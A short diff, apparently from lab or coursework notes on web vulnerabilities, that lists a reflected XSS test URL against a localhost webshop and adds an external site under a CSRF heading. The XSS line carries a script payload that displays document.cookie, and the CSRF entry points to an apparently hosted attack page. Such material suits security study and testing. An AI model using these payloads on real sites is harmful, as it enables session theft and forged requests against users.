@@ -5,4 +5,4 @@ XSS:
 http://localhost/webshop/?keyword=%3Cscript%3Ealert(document.cookie)%3C/script%3E
 
 CSRF:
-Website: 
+Website: csfr-webshop.tiiny.site
